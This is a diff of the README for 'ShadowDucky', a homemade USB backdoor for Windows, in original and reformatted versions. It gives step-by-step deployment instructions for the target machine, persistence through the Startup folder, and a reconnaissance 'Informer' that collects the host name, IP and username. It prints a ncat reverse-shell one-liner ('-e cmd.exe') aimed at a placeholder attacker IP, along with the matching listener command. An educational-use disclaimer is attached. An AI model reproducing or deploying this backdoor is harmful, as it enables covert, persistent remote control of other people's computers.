@@ -2,103 +2,66 @@
 
 ![ShadowDucky](https://user-images.githubusercontent.com/122622018/214044473-d0ce4b61-d29f-4951-b54e-67dd459dee8a.png)
 
+This is a homemade "Rubber Ducky." It provides the user with a reverse shell and can grab information for Windows-to-Windows applications.
 
-This is a home made "Rubber Ducky". it gives the user a reverse shell and can grab information for Windows to Windows Application
+**NOTE:**
+- Most file paths in the files start with "D:\" because its application is from a USB. The "ShadowDuckyV1.2A" folder is not needed; the proper format for the flash drive is how it's set up inside that folder.
+- Shortcuts may need to be re-made for your application.
 
-NOTE: most of the file paths in the files start with "D:\" this is because its application is from a USB. aswell as the folder "ShadowDuckyV1.2A" folder is not needed the proper format for the flashdrive is how its set up inside that folder.
-NOTE: Shortcuts may have to be re-made for your application.
+---
+**WELCOME TO SHADOW DUCKY...**
+*TRY AND READ THE HIDDEN MESSAGE...*
 
+INFO: This is a USB remote backdoor. The program "ShadowDucky" will run when "ShadowDuckyV2.vsb" is double-clicked. Some files will have to be edited in Notepad to suit its application. Please follow the listed instructions below to help you properly run "ShadowDucky."
 
-------------WELCOME TO SHADOW DUCKY... -------------------------------------------------TRY AND READ THE HIDDEN MESSAGE...-----------------------------
+This was created as a project to learn PowerShell functionality, scripting with different coding languages, and reverse shelling. It is a reverse shell for Windows to Windows.
 
-INFO: This is a USB remote back door. This program "ShadowDucky" will run when
-"ShadowDuckyV2.vsb" is double clicked. Some of the files will have to be edited
-in notepad to suit it best for it's application. Please follow the listed instructions
-below to help you properly run "ShadowDucky". 
+**NOTE:**
+- Required resources will be PowerShell, Nmap, and Windows.
+- ShadowDucky uses a combination of VBScript, ".bat" cmd, and PowerShell functionality.
+- It runs in the background for better use.
 
-This was created as a project to learn Powershell functionality, scripting with different
-coding languages, and reverse shelling. This is a reverse shell for Windows to Windows.
+---
+**INSTRUCTIONS:**
 
-NOTE: Required rescourses will be Powershell, Nmap, Windows.
+1. Install "nmap" on both your computer and the target device to use ShadowDucky. [Download Nmap](https://nmap.org/download).
 
-ShadowDucky: Uses a combination of VBScript, ".bat" cmd and powershell functionality.
-This program once ran will move the RubberDucky.bat into the "Intel" file and the 
-"ShadowDucky.vsb" to the Startup folder to activate each time the computer starts
-up and is logged into. It will continuesly ping the host computer until a connection
-is made, after the host disconnects it will resume pinging until theres a new connection.
-Each time the target computer is on it will allow for a reverse shell from a remote device at anypoint in time 
-(as long as target device is on).
+2. Place the IP of your host device into "RubberDucky.bat." Enter the IP of the host and the PORT being used into that function.
+   Example: `powershell -command do {ncat FF.FF.FF.FF PORT -e cmd.exe} until ($ping)`
 
-NOTE: ShadowDucky runs in the background for better use.
+3. After changing settings, plug ShadowDucky USB into the target device, double-click ShadowDuckyV2.vbs, and watch the show.
+   Return to the host device and use PowerShell with the following command to connect to the target device.
+   Example: `ncat -l -p PORT -v`
 
--------------------------------------------------------------INSTRUCTIONS-----------------------------------------------------------------------------
-
-1st: You will need to install "nmap" on both your computer and target device in order to use ShadowDucky.
-Nmap: https://nmap.org/download
-
-2nd: You will need to place the IP of your host device into "RubberDucky.bat"
-     you place IP of host and PORT being used into that function.
-
-EX: powershell -command do {ncat FF.FF.FF.FF PORT -e cmd.exe} until ($ping) 
-EX: powershell -command do {ncat 00.00.00.00 0000 -e cmd.exe} until ($ping)
-
-
-3th: After settings are changed, plug ShadowDucky usb into target device
-     and double click ShadowDuckyV2.vbs and watch the show.
-	 return to Host device and use powershell and use the following command 
-	 to connect the target device.
-	 
-EX: ncat -l -p PORT -v
-EX: ncat -l -p 0000 -v
-    make sure the port is the same number as the port set up in "RubberDucky.bat"	 
-
-4th:ENJOY @-[:]
+4. Enjoy! @-[:]
 
 HIDDEN MESSAGE: sx& vqz& rlj& bulf& gost& kztg& djqp& gou& hzggtum& olt& huazj& ljf& sw& lnbulfv& sj& oubu& plndsja& lbqzjf&.& &Solfqp& qb& jqg& vqz& rljg& tuu& wu
 
-ADVISEMENT & DISCLAIMER: This application was made for purely Educational Purposes. 
-                        Developer will not be heald liable for any miss use with
-                        this source code. Please be sure if you are going to use
-                        "ShadowDucky" that it is on your own devices or you have
-                        permission from the owner of the device(s). 
+**ADVISORY & DISCLAIMER:**
+This application was made for purely educational purposes. The developer will not be held liable for any misuse of this source code. Please ensure that if you are going to use "ShadowDucky," it is on your own devices or you have permission from the owner of the device(s).
+
+---
+**WELCOME TO SHADOW DUCKY INFORMER:**
+
+**NOTICE:** Use Informer before ShadowDucky to get info to set up ShadowDucky for usage.
+
+ShadowDucky Informer helps with getting the information you need to edit and use ShadowDucky. This Informer will give the user a printout in the ShadowDucky USB, Intel-Report Folder. The current computer's name, IPv4, User Name, and OS will be printed out into Intel-Report.txt.
+
+**INSTRUCTIONS:**
+- Double-click Informer.vbs and wait a minute for your report to be given.
+- After one minute, check the Intel-Report Folder and use the information in the ".txt" to set up ShadowDucky.
+
+**TO SET UP SHADOWDUCKY:**
+- Read the "README.txt" in the README Folder.
+
+**DISCLAIMER:**
+This application was made for purely educational purposes. The developer will not be held liable for any misuse of this source code. Please ensure that if you are going to use "ShadowDucky," it is on your own devices or you have permission from the owner of the device(s).
+
+---
+**Please Be Responsible**
+
 +---------+
 | Shadow  |
 |   Drums |
-|  TM     |
+|    TM   |
 +---------+
------------------------------------------------------------------------------
-
---------------WELCOME TO SHADOW DUCKY INFORMER-------------------------------------------
-
-NOTICE: USE INFORMER BEFOR SHADOWDUCKY TO GET INFO TO SET UP SHADOWDUCKY FOR USAGE
-
-ShadowDucky Informer helps with getting the information you need in order to edit and 
-use ShadowDucky. "This Informer" will give the user a print out in the ShadowDucky USB,
-Intel-Report Folder. The current computers name, IPv4, User Name, and OS will be printed
-out into Intel-Report.txt
-
---------------------------------------INSTRUCTIONS---------------------------------------
-
-Double click Informer.vbs and wait a minute for your report to be given.
-After one minute check the Intel-Report Folder and use the information
-in the ".txt" to set up ShadowDucky.
-
-TO SET UP SHADOWDUCKY:
-
-Read the "README.txt" in the README Folder
-
------------------------------------------------------------------------------------------
-
-          DISCLAIMER:   This application was made for purely Educational Purposes. 
-                        Developer will not be heald liable for any miss use with
-                        this source code. Please be sure if you are going to use
-                        "ShadowDucky" that it is on your own devices or you have
-                        permission from the owner of the device(s).
-------------
-|  Shadow  |
-|    Drums |
-|   TM     |
-------------
------------------------------------------------------------------------------
-
-Please Be Responsible
